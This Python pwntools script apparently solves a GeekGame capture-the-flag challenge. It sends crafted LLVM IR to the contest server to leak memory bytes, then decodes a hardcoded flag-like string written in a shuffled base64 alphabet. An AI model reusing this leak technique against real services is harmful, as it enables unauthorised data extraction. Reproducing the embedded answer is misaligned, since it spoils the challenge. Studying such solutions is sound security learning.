from pwn import *
import time

def b64dec(s):
    bchars_fake = 'ABCDEFGHIJKLMN0PQRSTuVWXYzadcbefghijk1mnopqrstUvwxy7Ol23456Z89+/'
    bchars_real = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    dic = {f: r for f, r in zip(bchars_fake, bchars_real)}
    s_real = ''.join(dic[f] for f in s)
    return base64.b64decode(s_real)

# ' '.join('re4d(%d);'%i for i in range(88))
# print('\n'.join(' '.join('wr1te(%d, %d);' % (80 + i, k + i) for i in range(8)) + '\np4int(103);' for k in range(0, 88, 8)))

program = """
; ModuleID = 'single.c'
source_filename = "single.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @m41n(i32 %0) #0 {
  %2 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  call void @g1ft()
  call void @wher3(i32 121)
  call void @re4d(i32 OFFSET_0)
  call void @re4d(i32 OFFSET_1)
  call void @re4d(i32 OFFSET_2)
  call void @re4d(i32 OFFSET_3)
  call void @re4d(i32 OFFSET_4)
  call void @re4d(i32 OFFSET_5)
  call void @re4d(i32 OFFSET_6)
  call void @re4d(i32 OFFSET_7)
  %3 = call i32 (...) @some_func()
  %4 = icmp ne i32 %3, 0
  br i1 %4, label %5, label %6

5:                                                ; preds = %1
  call void @wher3(i32 112)
  br label %6

6:                                                ; preds = %5, %1
  call void @wr1te(i32 80, i32 7)
  call void @wr1te(i32 81, i32 6)
  call void @wr1te(i32 82, i32 5)
  call void @wr1te(i32 83, i32 4)
  call void @wr1te(i32 84, i32 3)
  call void @wr1te(i32 85, i32 2)
  call void @wr1te(i32 86, i32 1)
  call void @wr1te(i32 87, i32 0)
  call void @p4int(i32 23)
  ret void
}

declare dso_local void @g1ft() #1

declare dso_local void @wher3(i32) #1

declare dso_local void @re4d(i32) #1

declare dso_local i32 @some_func(...) #1

declare dso_local void @wr1te(i32, i32) #1

declare dso_local void @p4int(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.0-4ubuntu1 "}

"""

import re

def exploit():
    all_b64 = bytes()
    for offset in range(0, 81, 7):
        program1 = program
        for i in range(8):
            program1 = program1.replace('OFFSET_%d' % i,
                                        '%d' % (offset + i))
        #print(program1)

        while True:
            try:
                r = remote('prob12.geekgame.pku.edu.cn', 10012)
                r.send('1230:XXX')

                r.recvuntil('Write your LLVM IR code below')

                program1 += '\n\n; EOF\n\n'
                r.send(program1)
                output = r.recvuntil('See you later~')
                r.close()
                output = output.decode('ascii')
            except EOFError:
                print('error connecting to geekgame. trying again in 30s')
                sleep(30)
                continue
            break
            
        print(output)
        matches = list(re.findall(r'Inst: (0x[a-z0-9]+)', output))
        print(matches)
        match_last = matches[-1]
        all_b64 += int(match_last, 16).to_bytes(8, byteorder='big')[:7]
        print(all_b64)

        time.sleep(6)

    print(all_b64)

if __name__ == '__main__':
    print(b64dec('zmxhz3tINHIOX7F7X3kwbXJfYuOOejFUzl9QNFNTXlboNFRfQW5fuDR7c7F8'))
